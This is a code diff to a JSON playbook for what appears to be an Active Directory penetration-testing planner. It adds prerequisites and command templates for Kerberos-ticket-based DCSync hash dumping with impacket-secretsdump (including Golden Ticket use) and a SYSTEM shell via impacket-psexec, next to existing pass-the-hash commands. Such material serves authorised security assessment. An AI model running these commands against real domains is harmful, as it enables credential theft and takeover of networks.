@@ -1080,7 +1080,16 @@
         "credential.available",
         "ad.domain_known"
       ],
-      "requires_any": [],
+      "requires_any": [
+        "ad.dc_candidate",
+        "kerberos.reachable",
+        "ldap.reachable",
+        "port:88",
+        "port:389",
+        "port:636",
+        "port:3268",
+        "port:3269"
+      ],
       "deprioritize_when": [
         "loot.ntds",
         "access.admin",
@@ -1426,7 +1435,9 @@
         "access.admin",
         "access.admin_share",
         "ad.control_paths",
-        "ad.domain_control"
+        "ad.domain_control",
+        "ad.sid_history",
+        "kerberos.tickets"
       ],
       "produces": [
         "loot.ntds",
@@ -1459,6 +1470,11 @@
           "tool": "impacket-secretsdump",
           "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",
           "note": "A replication-based extraction of one account, quieter than the full sync when you only need the Administrator hash to pass-the-hash."
+        },
+        {
+          "tool": "impacket-secretsdump",
+          "run": "KRB5CCNAME={{ccache_file}} impacket-secretsdump -k -no-pass -dc-ip {{target}} '{{domain}}/{{user}}@{{dc_fqdn}}' -just-dc",
+          "note": "Kerberos ticket-authenticated DRSUAPI replication (-k -no-pass) using an exported ccache (Golden Ticket, cross-trust extra-SID ticket, or delegated TGT) against the DC FQDN."
         },
         {
           "tool": "mimikatz",
@@ -1562,6 +1578,7 @@
         "credential.password",
         "credential.plaintext",
         "hash.ntlm",
+        "kerberos.tickets",
         "rdp.authenticated",
         "access.admin_share",
         "ad.gpo_control"
@@ -1635,6 +1652,11 @@
           "tool": "impacket-psexec",
           "run": "impacket-psexec -hashes ':{{nthash}}' {{user}}@{{target}}",
           "note": "The pass-the-hash form, no plaintext required."
+        },
+        {
+          "tool": "impacket-psexec",
+          "run": "KRB5CCNAME={{ccache_file}} impacket-psexec -k -no-pass -dc-ip {{target}} '{{domain}}/{{user}}@{{dc_fqdn}}'",
+          "note": "Kerberos ticket-authenticated SYSTEM shell (-k -no-pass) using an exported ccache against the target FQDN and DC IP."
         },
         {
           "tool": "impacket-wmiexec",
@@ -2274,6 +2296,7 @@
     },
     {
       "id": "nxc-arsenal",
+      "speculative": true,
       "title": "NetExec Arsenal (One Tool, Most of AD)",
       "hypothesis": "NetExec is the AD Swiss-army knife: enumeration, validation, spidering, roasting, dumping, and execution checks, all sharing one authentication syntax. Learn the flag families a single time and you can run most of a domain assessment from this one tool. This card is the cheat sheet; the Tools view gathers every nxc command in one spot.",
       "tool": "nxc",
@@ -2372,6 +2395,7 @@
         "credential.available"
       ],
       "requires_any": [
+        "credential.reuse_candidate",
         "ad.computer_list",
         "network.subnet_candidate",
         "host.arp_neighbor",
